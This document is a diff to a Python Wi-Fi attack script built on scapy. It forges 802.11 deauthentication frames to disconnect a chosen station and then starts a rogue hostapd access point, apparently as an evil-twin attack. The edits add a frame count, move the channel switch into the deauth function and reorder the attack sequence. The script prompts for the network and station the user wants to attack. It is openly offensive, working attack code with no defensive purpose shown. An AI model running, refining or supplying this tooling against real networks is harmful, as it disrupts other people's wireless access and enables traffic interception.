@@ -146,8 +146,8 @@ def handler(pkt):
             if noise_filter(pkt.addr1, pkt.addr2):
                 return
 
-    if pkt.type == 2:  # Data frames
-        add_client(pkt)
+        if pkt.type == 2:  # Data frames
+            add_client(pkt)
 
 
 # mac address of the interface on monitor mode
@@ -215,13 +215,14 @@ def output_client(net):
                                                        client_AP[i]['BSSID']))
 
 
-def deauth(target_mac, iface):
+def deauth(target_mac, iface, count):
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    os.system("iwconfig " + iface + " channel " + str(client_AP[target_mac]['channel']))
     print("[+] started deauth attack...")
-    sendp(frame, iface=iface, loop=1, inter=.1, verbose=1)
+    sendp(frame, iface=iface, count=count, inter=.1, verbose=1)
 
 
 def launchHostapd(iface, net):
@@ -241,7 +242,6 @@ def launchHostapd(iface, net):
     f.write(hostapdConfig)
     f.close()
     os.system("hostapd -B hostapd.conf")
-    print('[+] hostapd succesfuly configured')
 
 
 if __name__ == "__main__":
@@ -265,11 +265,10 @@ if __name__ == "__main__":
     network = input("enter the mac address of the network you want to attack: ")
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
-    os.system("iwconfig "+interface+" channel " + str(client_AP[victim]['channel']))
-
     time.sleep(1)
+    deauth(victim, interface, count)
+    time.sleep(2)
     t = Thread(target=launchHostapd, args=(interface, network))
     t.setDaemon(True)
     t.start()
-    time.sleep(3)
-    deauth(victim, interface)
+
